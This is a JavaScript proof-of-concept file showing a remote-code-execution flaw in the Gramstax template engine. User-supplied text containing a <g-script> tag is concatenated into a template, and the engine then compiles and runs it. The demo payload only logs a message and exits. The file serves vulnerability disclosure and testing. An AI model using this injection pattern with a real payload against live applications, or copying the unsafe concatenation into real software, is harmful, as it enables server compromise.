/**
 * Case 4: Untrusted Template Input (RCE)
 *
 * This POC demonstrates the MOST DANGEROUS scenario: building the template
 * string itself using untrusted user input.
 *
 * Vulnerability: If a developer allows a user to provide text that is then
 * concatenated into the template string before compilation, the user can
 * inject any Gramstax tag, including <g-script> or execution blocks {~ ~}.
 *
 * Risk: Immediate and complete Remote Code Execution (RCE).
 */

import {TemplateEngine} from "../src/template/engine.js"

console.log(`--- CASE 4: UNTRUSTED TEMPLATE INPUT ---`)

// Imagine the developer allows a user to "customize" their welcome message
// by providing a string that is inserted directly into the template.
const userCustomMessage = `Welcome! <g-script> console.log("!!! VULNERABILITY ALERT: RCE via <g-script> tag !!!"); process.exit(); </g-script>`

// DANGEROUS: Concatenating user input into the template source
const maliciousTemplate = `
  <g-base>
    <g-message>
      ${userCustomMessage}
    </g-message>
  </g-base>
`

console.log(`Compiling malicious template...`)
// The engine will see the <g-script> tag and process it as a real instruction.
const messages = TemplateEngine.compileBlockGMessage(maliciousTemplate)

console.log(`Executing compiled function...`)
const render = messages.default?.default
if (!render) throw new Error(`compile produced no default message`)
render({})
